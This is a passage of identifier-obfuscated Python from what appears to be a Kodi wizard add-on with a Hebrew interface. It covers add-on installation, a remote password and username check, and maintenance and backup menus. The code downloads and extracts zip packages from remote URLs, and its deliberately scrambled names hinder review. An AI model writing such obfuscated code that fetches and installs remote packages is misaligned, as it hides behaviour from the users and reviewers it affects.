			O0OO0OO0OO0OO000O =wiz .openURL (O0OOO0O0OO000O0OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2518
			OO000O0O0OO0O000O =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOOO0000O00000000 ).findall (O0OO0OO0OO0OO000O )#line:2519
			if len (OO000O0O0OO0O000O )>0 :#line:2520
				for O00OOOO0000O00OO0 ,O0OOO0O0OO000O0OO ,O00000OOOO0OOOO0O ,O0O0000O0O0OO00OO ,O00O0OOOO0000OO0O ,O0O00000O0OO0OO0O ,O0000O0000OOO0000 ,OO000OO0OO00000OO ,OO0OOOO0OOO0000OO in OO000O0O0OO0O000O :#line:2521
					if os .path .exists (os .path .join (ADDONS ,OOOO0000O00000000 )):#line:2522
						OOO0O0O0OOO0O0O0O =['Launch Addon','Remove Addon']#line:2523
						O0OO0OO0OOOOO00OO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OOO0O0O0OOO0O0O0O )#line:2524
						if O0OO0OO0OOOOO00OO ==0 :#line:2525
							wiz .ebi ('RunAddon(%s)'%OOOO0000O00000000 )#line:2526
							xbmc .sleep (1000 )#line:2527
							return True #line:2528
						elif O0OO0OO0OOOOO00OO ==1 :#line:2529
							wiz .cleanHouse (os .path .join (ADDONS ,OOOO0000O00000000 ))#line:2530
							try :wiz .removeFolder (os .path .join (ADDONS ,OOOO0000O00000000 ))#line:2531
							except :pass #line:2532
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOO0000O00000000 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2533
								removeAddonData (OOOO0000O00000000 )#line:2534
							wiz .refresh ()#line:2535
							return True #line:2536
						else :#line:2537
							return False #line:2538
					OO000OO0O0OO0O0OO =os .path .join (ADDONS ,O00000OOOO0OOOO0O )#line:2539
					if not O00000OOOO0OOOO0O .lower ()=='none'and not os .path .exists (OO000OO0O0OO0O0OO ):#line:2540
						wiz .log ("Repository not installed, installing it")#line:2541
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OOOO0000O00000000 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00000OOOO0OOOO0O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2542
							OOO000OO00000O0OO =wiz .parseDOM (wiz .openURL (O0O0000O0O0OO00OO ),'addon',ret ='version',attrs ={'id':O00000OOOO0OOOO0O })#line:2543
							if len (OOO000OO00000O0OO )>0 :#line:2544
								OOOO0O0O0O0OO00OO ='%s%s-%s.zip'%(O00O0OOOO0000OO0O ,O00000OOOO0OOOO0O ,OOO000OO00000O0OO [0 ])#line:2545
								wiz .log (OOOO0O0O0O0OO00OO )#line:2546
								if KODIV >=17 :wiz .addonDatabase (O00000OOOO0OOOO0O ,1 )#line:2547
								installAddon (O00000OOOO0OOOO0O ,OOOO0O0O0O0OO00OO )#line:2548
								wiz .ebi ('UpdateAddonRepos()')#line:2549
								wiz .log ("Installing Addon from Kodi")#line:2551
								OOOO0OO000OOOOOO0 =installFromKodi (OOOO0000O00000000 )#line:2552
								wiz .log ("Install from Kodi: %s"%OOOO0OO000OOOOOO0 )#line:2553
								if OOOO0OO000OOOOOO0 :#line:2554
									wiz .refresh ()#line:2555
									return True #line:2556
							else :#line:2557
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O00000OOOO0OOOO0O )#line:2558
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OOOO0000O00000000 ,O00000OOOO0OOOO0O ))#line:2559
					elif O00000OOOO0OOOO0O .lower ()=='none':#line:2560
						wiz .log ("No repository, installing addon")#line:2561
						OO00000O00O0000O0 =OOOO0000O00000000 #line:2562
						O00OOO0O0O0O00OOO =O0OOO0O0OO000O0OO #line:2563
						installAddon (OOOO0000O00000000 ,O0OOO0O0OO000O0OO )#line:2564
						wiz .refresh ()#line:2565
						return True #line:2566
					else :#line:2567
						wiz .log ("Repository installed, installing addon")#line:2568
						OOOO0OO000OOOOOO0 =installFromKodi (OOOO0000O00000000 ,False )#line:2569
						if OOOO0OO000OOOOOO0 :#line:2570
							wiz .refresh ()#line:2571
							return True #line:2572
					if os .path .exists (os .path .join (ADDONS ,OOOO0000O00000000 )):return True #line:2573
					OO0OO0O00O00OOOOO =wiz .parseDOM (wiz .openURL (O0O0000O0O0OO00OO ),'addon',ret ='version',attrs ={'id':OOOO0000O00000000 })#line:2574
					if len (OO0OO0O00O00OOOOO )>0 :#line:2575
						O0OOO0O0OO000O0OO ="%s%s-%s.zip"%(O0OOO0O0OO000O0OO ,OOOO0000O00000000 ,OO0OO0O00O00OOOOO [0 ])#line:2576
						wiz .log (str (O0OOO0O0OO000O0OO ))#line:2577
						if KODIV >=17 :wiz .addonDatabase (OOOO0000O00000000 ,1 )#line:2578
						installAddon (OOOO0000O00000000 ,O0OOO0O0OO000O0OO )#line:2579
						wiz .refresh ()#line:2580
					else :#line:2581
						wiz .log ("no match");return False #line:2582
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2583
		else :wiz .log ("[Addon Installer] Text File: %s"%O0O0000OO000O000O )#line:2584
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2585
def installFromKodi (O00OOO0O0O00OO00O ,over =True ):#line:2587
	if over ==True :#line:2588
		xbmc .sleep (2000 )#line:2589
	wiz .ebi ('RunPlugin(plugin://%s)'%O00OOO0O0O00OO00O )#line:2591
	if not wiz .whileWindow ('yesnodialog'):#line:2592
		return False #line:2593
	xbmc .sleep (1000 )#line:2594
	if wiz .whileWindow ('okdialog'):#line:2595
		return False #line:2596
	wiz .whileWindow ('progressdialog')#line:2597
	if os .path .exists (os .path .join (ADDONS ,O00OOO0O0O00OO00O )):return True #line:2598
	else :return False #line:2599
def installAddon (OO0O00OOO0OOO00O0 ,OO0OO0O0O0O0O000O ):#line:2601
	if not wiz .workingURL (OO0OO0O0O0O0O000O )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OO0O00OOO0OOO00O0 ,COLOR2 ));return #line:2602
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2603
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O00OOO0OOO00O0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2604
	OO00OO00000O00OO0 =OO0OO0O0O0O0O000O .split ('/')#line:2605
	O0000OO0OO0OO0O0O =os .path .join (PACKAGES ,OO00OO00000O00OO0 [-1 ])#line:2606
	try :os .remove (O0000OO0OO0OO0O0O )#line:2607
	except :pass #line:2608
	downloader .download (OO0OO0O0O0O0O000O ,O0000OO0OO0OO0O0O ,DP )#line:2609
	OO0O0O00OOOO0000O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O00OOO0OOO00O0 )#line:2610
	DP .update (0 ,OO0O0O00OOOO0000O ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2611
	O00O0OO0000O0O00O ,OOO00OO0O0O0OO0O0 ,O0OO000O000O00000 =extract .all (O0000OO0OO0OO0O0O ,ADDONS ,DP ,title =OO0O0O00OOOO0000O )#line:2612
	DP .update (0 ,OO0O0O00OOOO0000O ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2613
	installed (OO0O00OOO0OOO00O0 )#line:2614
	installDep (OO0O00OOO0OOO00O0 ,DP )#line:2615
	DP .close ()#line:2616
	wiz .ebi ('UpdateAddonRepos()')#line:2617
	wiz .ebi ('UpdateLocalAddons()')#line:2618
	wiz .refresh ()#line:2619
def installDep (OO0O0OO00OO000OOO ,DP =None ):#line:2621
	O0OOOO0OO000O0OOO =os .path .join (ADDONS ,OO0O0OO00OO000OOO ,'addon.xml')#line:2622
	if os .path .exists (O0OOOO0OO000O0OOO ):#line:2623
		O00OO00000O0000O0 =open (O0OOOO0OO000O0OOO ,mode ='r');OO00O0OO0OO0OOO00 =O00OO00000O0000O0 .read ();O00OO00000O0000O0 .close ();#line:2624
		OOOO0OO0O0OOOOOO0 =wiz .parseDOM (OO00O0OO0OO0OOO00 ,'import',ret ='addon')#line:2625
		for O0000O0OO000000OO in OOOO0OO0O0OOOOOO0 :#line:2626
			if not 'xbmc.python'in O0000O0OO000000OO :#line:2627
				if not DP ==None :#line:2628
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0000O0OO000000OO ))#line:2629
				wiz .createTemp (O0000O0OO000000OO )#line:2630
def installed (O000000000O000000 ):#line:2657
	OO0O0O00OO00OO000 =os .path .join (ADDONS ,O000000000O000000 ,'addon.xml')#line:2658
	if os .path .exists (OO0O0O00OO00OO000 ):#line:2659
		try :#line:2660
			OOO0OO0O00OOO0OO0 =open (OO0O0O00OO00OO000 ,mode ='r');OOO0O0OOOOOOOOOOO =OOO0OO0O00OOO0OO0 .read ();OOO0OO0O00OOO0OO0 .close ()#line:2661
			OO0OO0OOOO00O00O0 =wiz .parseDOM (OOO0O0OOOOOOOOOOO ,'addon',ret ='name',attrs ={'id':O000000000O000000 })#line:2662
			O00O00OO0O0OO000O =os .path .join (ADDONS ,O000000000O000000 ,'icon.png')#line:2663
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OO0OOOO00O00O0 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O00O00OO0O0OO000O )#line:2664
		except :pass #line:2665
def youtubeMenu (url =None ):#line:2667
	if not YOUTUBEFILE =='http://':#line:2668
		if url ==None :#line:2669
			O000O0OOO00O00OOO =wiz .workingURL (YOUTUBEFILE )#line:2670
			OO0OO00OO00OOO0OO =uservar .YOUTUBEFILE #line:2671
		else :#line:2672
			O000O0OOO00O00OOO =wiz .workingURL (url )#line:2673
			OO0OO00OO00OOO0OO =url #line:2674
		if O000O0OOO00O00OOO ==True :#line:2675
			OO0O0OOOOOOOO00O0 =wiz .openURL (OO0OO00OO00OOO0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2676
			O0OOOOOOOO0O0OO0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0O0OOOOOOOO00O0 )#line:2677
			if len (O0OOOOOOOO0O0OO0O )>0 :#line:2678
				for O0O0O00O0000OOOO0 ,O000OOO0O00O00O0O ,url ,OO000OOO0OO000OOO ,OO0O0000OO0O00000 ,O000O0O0O0O000OOO in O0OOOOOOOO0O0OO0O :#line:2679
					if O000OOO0O00O00O0O .lower ()=="yes":#line:2680
						addDir ("[B]%s[/B]"%O0O0O00O0000OOOO0 ,'youtube',url ,description =O000O0O0O0O000OOO ,icon =OO000OOO0OO000OOO ,fanart =OO0O0000OO0O00000 ,themeit =THEME3 )#line:2681
					else :#line:2682
						addFile (O0O0O00O0000OOOO0 ,'viewVideo',url =url ,description =O000O0O0O0O000OOO ,icon =OO000OOO0OO000OOO ,fanart =OO0O0000OO0O00000 ,themeit =THEME2 )#line:2683
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2684
		else :#line:2685
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2686
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2687
			addFile ('%s'%O000O0OOO00O00OOO ,'',themeit =THEME3 )#line:2688
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2689
	setView ('files','viewType')#line:2690
def STARTP ():#line:2691
	OOOO0OOOO000OO0O0 =(ADDON .getSetting ("pass"))#line:2692
	if BUILDNAME =="":#line:2693
	 if not NOTIFY =='true':#line:2694
          OOOOO00OOO0OOOO00 =wiz .workingURL (NOTIFICATION )#line:2695
	 if not NOTIFY2 =='true':#line:2696
          OOOOO00OOO0OOOO00 =wiz .workingURL (NOTIFICATION2 )#line:2697
	 if not NOTIFY3 =='true':#line:2698
          OOOOO00OOO0OOOO00 =wiz .workingURL (NOTIFICATION3 )#line:2699
	O0OOO000O0OOO0O0O =OOOO0OOOO000OO0O0 #line:2700
	OOOOO00OOO0OOOO00 =urllib2 .Request (SPEED )#line:2701
	O0O0000OO0OO00O0O =urllib2 .urlopen (OOOOO00OOO0OOOO00 )#line:2702
	OO0000000O0O0O000 =O0O0000OO0OO00O0O .readlines ()#line:2704
	OOOO000O00O0O0O0O =0 #line:2708
	for O0000O0000O00O0O0 in OO0000000O0O0O000 :#line:2709
		if O0000O0000O00O0O0 .split (' ==')[0 ]==OOOO0OOOO000OO0O0 or O0000O0000O00O0O0 .split ()[0 ]==OOOO0OOOO000OO0O0 :#line:2710
			OOOO000O00O0O0O0O =1 #line:2711
			break #line:2712
	if OOOO000O00O0O0O0O ==0 :#line:2713
					OO000000OOOO0O0O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2714
					if OO000000OOOO0O0O0 :#line:2716
						ADDON .openSettings ()#line:2718
						sys .exit ()#line:2720
					else :#line:2721
						sys .exit ()#line:2722
	return 'ok'#line:2726
def STARTP2 ():#line:2727
	O00O000O0OOOO0OOO =(ADDON .getSetting ("user"))#line:2728
	O000O0O00OO000000 =(UNAME )#line:2730
	O000O00O0O0O00OO0 =urllib2 .urlopen (O000O0O00OO000000 )#line:2731
	OO00OO00OO0O0OO0O =O000O00O0O0O00OO0 .readlines ()#line:2732
	OOO0OO0000O00O0O0 =0 #line:2733
	for O0OO0O0O0O0OO0O00 in OO00OO00OO0O0OO0O :#line:2736
		if O0OO0O0O0O0OO0O00 .split (' ==')[0 ]==O00O000O0OOOO0OOO or O0OO0O0O0O0OO0O00 .split ()[0 ]==O00O000O0OOOO0OOO :#line:2737
			OOO0OO0000O00O0O0 =1 #line:2738
			break #line:2739
	if OOO0OO0000O00O0O0 ==0 :#line:2740
		OO0O0O0OO00OOOO00 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2741
		if OO0O0O0OO00OOOO00 :#line:2743
			ADDON .openSettings ()#line:2745
			sys .exit ()#line:2748
		else :#line:2749
			sys .exit ()#line:2750
	return 'ok'#line:2754
def passandpin ():#line:2755
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2756
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2757
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2758
def passandUsername ():#line:2759
	ADDON .openSettings ()#line:2760
def folderback ():#line:2763
    O000OO0O0O0O0O0O0 =ADDON .getSetting ("path")#line:2764
    if O000OO0O0O0O0O0O0 :#line:2765
      O000OO0O0O0O0O0O0 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2766
      ADDON .setSetting ("path",O000OO0O0O0O0O0O0 )#line:2767
def backmyupbuild ():#line:2770
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2774
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2775
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2776
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2778
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2779
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2780
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2782
def maintMenu (view =None ):#line:2786
	O00O0000O0OO00000 ='[B][COLOR green]ON[/COLOR][/B]';OOOOOOOO000OOOOO0 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2788
	OO0OO000OOOO0O00O ='true'if AUTOCLEANUP =='true'else 'false'#line:2789
	OO00000OOO0OOO0O0 ='true'if AUTOCACHE =='true'else 'false'#line:2790
	OOO00OO0O0000O0O0 ='true'if AUTOPACKAGES =='true'else 'false'#line:2791
	O0000OO00OOOOOO00 ='true'if AUTOTHUMBS =='true'else 'false'#line:2792
	O0OO00O00OO0OOOO0 ='true'if SHOWMAINT =='true'else 'false'#line:2793
	OO0O0OOO000O0000O ='true'if INCLUDEVIDEO =='true'else 'false'#line:2794
	O0O00O0O0OO00OO0O ='true'if INCLUDEALL =='true'else 'false'#line:2795
	OOOOO000O00OO0O0O ='true'if THIRDPARTY =='true'else 'false'#line:2796
	if wiz .Grab_Log (True )==False :O0OO000O00O0000O0 =0 #line:2797
	else :O0OO000O00O0000O0 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2798
	if wiz .Grab_Log (True ,True )==False :OOO0O00OO0000OO00 =0 #line:2799
	else :OOO0O00OO0000OO00 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2800
	OO0OOOO0OOO00000O =int (O0OO000O00O0000O0 )+int (OOO0O00OO0000OO00 )#line:2801
	OO0OOOOO000OO00O0 =str (OO0OOOO0OOO00000O )+' Error(s) Found'if OO0OOOO0OOO00000O >0 else 'None Found'#line:2802
	O0O0O00OOO000OOOO =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2803
	if O0O00O0O0OO00OO0O =='true':#line:2804
		OOOO0OO000OOOO000 ='true'#line:2805
		OOO000O0O00O0O000 ='true'#line:2806
		OOO00OOO0O0000OO0 ='true'#line:2807
		OO0O0O0O0000OO000 ='true'#line:2808
		O0OOOOOOO0OOOO00O ='true'#line:2809
		OO00O0OOOOOO0OO0O ='true'#line:2810
		OO00O0O000OO00000 ='true'#line:2811
		O0O00OOO0OOO0OOOO ='true'#line:2812
	else :#line:2813
		OOOO0OO000OOOO000 ='true'if INCLUDEBOB =='true'else 'false'#line:2814
		OOO000O0O00O0O000 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2815
		OOO00OOO0O0000OO0 ='true'if INCLUDESPECTO =='true'else 'false'#line:2816
		OO0O0O0O0000OO000 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2817
		O0OOOOOOO0OOOO00O ='true'if INCLUDEEXODUS =='true'else 'false'#line:2818
		OO00O0OOOOOO0OO0O ='true'if INCLUDEONECHAN =='true'else 'false'#line:2819
		OO00O0O000OO00000 ='true'if INCLUDESALTS =='true'else 'false'#line:2820
		O0O00OOO0OOO0OOOO ='true'if INCLUDESALTSHD =='true'else 'false'#line:2821
	O00O00000000O00O0 =wiz .getSize (PACKAGES )#line:2822
	O0000O000OOO0O0O0 =wiz .getSize (THUMBS )#line:2823
	O0OOO00OOO0OOO0O0 =wiz .getCacheSize ()#line:2824
	OO000OO0O0O000O0O =O00O00000000O00O0 +O0000O000OOO0O0O0 +O0OOO00OOO0OOO0O0 #line:2825
	O00O000OOOO0000OO =['Daily','Always','3 Days','Weekly']#line:2826
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2827
	if view =="clean"or SHOWMAINT =='true':#line:2828
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO000OO0O0O000O0O ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2829
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OOO00OOO0OOO0O0 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2830
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00O00000000O00O0 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2831
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0000O000OOO0O0O0 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2832
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2834
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2835
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2836
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2837
	if view =="addon"or SHOWMAINT =='false':#line:2838
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2845
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2846
	if view =="misc"or SHOWMAINT =='true':#line:2847
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2850
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2851
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('View Errors in Log: %s'%(OO0OOOOO000OO00O0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('Clear Wizard Log File%s'%O0O0O00OOO000OOOO ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2856
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2857
	if view =="backup"or SHOWMAINT =='true':#line:2858
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2862
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2864
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2865
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2866
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2867
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2870
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2871
	if view =="tweaks"or SHOWMAINT =='true':#line:2872
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2873
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2874
		else :#line:2875
			if os .path .exists (ADVANCED ):#line:2876
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2877
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2878
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2879
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2880
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2881
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2882
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2883
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2884
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2885
	addFile ('Show All Maintenance: %s'%O0OO00O00OO0OOOO0 .replace ('true',O00O0000O0OO00000 ).replace ('false',OOOOOOOO000OOOOO0 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2886
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2887
	addFile ('Third Party Wizards: %s'%OOOOO000O00OO0O0O .replace ('true',O00O0000O0OO00000 ).replace ('false',OOOOOOOO000OOOOO0 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2888
	if OOOOO000O00OO0O0O =='true':#line:2889
		OO0O0O00O00O00O00 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2890
		O000O0O000OO0O00O =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2891
		O00O00000OO0OO000 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2892
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0O0O00O00O00O00 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2893
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O000O0O000OO0O00O ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2894
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00O00000OO0OO000 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2895
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2896
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OO0OO000OOOO0O00O .replace ('true',O00O0000O0OO00000 ).replace ('false',OOOOOOOO000OOOOO0 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2897
	if OO0OO000OOOO0O00O =='true':#line:2898
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O00O000OOOO0000OO [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2899
		addFile ('--- ניקוי קאש בהפעלה: %s'%OO00000OOO0OOO0O0 .replace ('true',O00O0000O0OO00000 ).replace ('false',OOOOOOOO000OOOOO0 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2900
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OOO00OO0O0000O0O0 .replace ('true',O00O0000O0OO00000 ).replace ('false',OOOOOOOO000OOOOO0 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2901
